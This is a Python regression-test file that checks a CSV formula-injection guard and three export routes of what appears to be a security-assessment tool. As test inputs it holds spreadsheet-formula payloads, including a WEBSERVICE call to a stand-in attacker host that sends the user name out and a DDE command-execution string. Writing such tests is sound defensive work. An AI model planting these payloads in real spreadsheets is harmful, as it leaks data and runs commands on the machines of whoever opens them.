"""Regression tests for CSV formula-injection hardening (v2.86.4).

Pins the shared ``app.services.csv_utils`` guard (``csv_safe`` /
``safe_csv_row``) and the ``/export`` CSV routes that write through it.

``ExportService._format_csv_report`` — the test-plan execution report, whose
raw agent strings prompted the guard — went with test plans in v2.442.0, and
its two cases with it.  The agent-written cells that remain in a CSV export
are the host report's ``execution_findings.csv`` (evidence records), pinned in
``test_report_dossier.py::test_test_findings_csv_names_tool_and_label_and_neutralizes_formulas``.
"""
from __future__ import annotations

import csv
import io

import pytest

from app.services.csv_utils import csv_safe


# ---------------------------------------------------------------------------
# Helper-level guarantees — the simplest contract first.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("dangerous", [
    "=WEBSERVICE(\"http://attacker.tld/?u=\"&USER())",
    "+1+1",
    "-CMD()",
    "@SUM(1+1)",
    "\tleading-tab",
    "\rleading-cr",
])
def test_csv_safe_prefixes_dangerous_cells(dangerous):
    """Every Excel/LibreOffice formula trigger gets a leading single quote."""
    out = csv_safe(dangerous)
    assert out.startswith("'"), f"expected single-quote prefix on {dangerous!r}, got {out!r}"


@pytest.mark.parametrize("safe", [
    "10.0.0.5",
    "host-01.lab.example.com",
    "Open SSH 8.4p1",
    "",
    "   leading space is fine",
    "Tag with = in middle is fine",
])
def test_csv_safe_passes_through_benign_values(safe):
    assert csv_safe(safe) == safe


def test_csv_safe_none_becomes_empty_string():
    assert csv_safe(None) == ""


# ---------------------------------------------------------------------------
# Endpoint-level — the three lightweight CSV branches in export.py that the
# v2.86.4 hardening missed (third code review #1): the routes that hand-roll
# csv.writer.
# ---------------------------------------------------------------------------


def test_out_of_scope_csv_neutralizes_malicious_hostname(
    client, db_session, test_project,
):
    """v2.91.4 — /export/out-of-scope CSV branch flows hostnames through
    safe_csv_row.  Pre-fix the hostname was emitted raw."""
    from app.db import models

    host = models.Host(
        ip_address="10.55.55.5",
        hostname="=WEBSERVICE(\"http://attacker.tld\")",
        state="up",
        project_id=test_project.id,
    )
    db_session.add(host)
    db_session.commit()

    resp = client.get(
        f"/api/v1/projects/{test_project.id}/export/out-of-scope?format_type=csv"
    )
    assert resp.status_code == 200
    rows = _parse_csv(resp.text)
    # Header row + at least one data row containing our host.
    data_row = next((r for r in rows[1:] if r and r[0] == "10.55.55.5"), None)
    assert data_row is not None, f"injected host missing from output: {rows!r}"
    assert data_row[1].startswith("'="), (
        f"hostname formula not neutralized: {data_row[1]!r}"
    )


def test_scope_hosts_csv_neutralizes_malicious_hostname(
    client, db_session, test_project,
):
    """v2.91.4 — /export/scope/{id}/hosts CSV branch flows hostnames
    through safe_csv_row."""
    from app.db import models

    scope = models.Scope(project_id=test_project.id, name="injection-target")
    db_session.add(scope)
    db_session.flush()

    subnet = models.Subnet(scope_id=scope.id, cidr="10.66.66.0/24")
    db_session.add(subnet)
    db_session.flush()

    host = models.Host(
        ip_address="10.66.66.6",
        hostname="+SUM(0)",
        state="up",
        project_id=test_project.id,
    )
    db_session.add(host)
    db_session.flush()
    db_session.add(models.HostSubnetMapping(host_id=host.id, subnet_id=subnet.id))
    db_session.commit()

    resp = client.get(
        f"/api/v1/projects/{test_project.id}/export/scope/{scope.id}?format_type=csv"
    )
    assert resp.status_code == 200, resp.text
    rows = _parse_csv(resp.text)
    data_row = next((r for r in rows[1:] if r and r[0] == "10.66.66.6"), None)
    assert data_row is not None, f"injected host missing from output: {rows!r}"
    assert data_row[1].startswith("'+"), (
        f"hostname formula not neutralized: {data_row[1]!r}"
    )


def test_scan_hosts_csv_neutralizes_malicious_hostname(
    client, db_session, test_project,
):
    """v2.91.4 — /export/scan/{id} CSV branch flows hostnames through
    safe_csv_row."""
    from app.db import models

    scan = models.Scan(
        project_id=test_project.id,
        filename="injection.xml",
        tool_name="nmap",
        scan_type="nmap_xml",
    )
    db_session.add(scan)
    db_session.flush()

    host = models.Host(
        ip_address="10.77.77.7",
        hostname="@CMD|'/c calc'!A1",
        state="up",
        project_id=test_project.id,
    )
    db_session.add(host)
    db_session.flush()
    db_session.add(models.HostScanHistory(host_id=host.id, scan_id=scan.id))
    db_session.commit()

    resp = client.get(
        f"/api/v1/projects/{test_project.id}/export/scan/{scan.id}?format_type=csv"
    )
    assert resp.status_code == 200, resp.text
    rows = _parse_csv(resp.text)
    data_row = next((r for r in rows[1:] if r and r[0] == "10.77.77.7"), None)
    assert data_row is not None, f"injected host missing from output: {rows!r}"
    assert data_row[1].startswith("'@"), (
        f"hostname formula not neutralized: {data_row[1]!r}"
    )


def _parse_csv(payload: str) -> list[list[str]]:
    return list(csv.reader(io.StringIO(payload)))
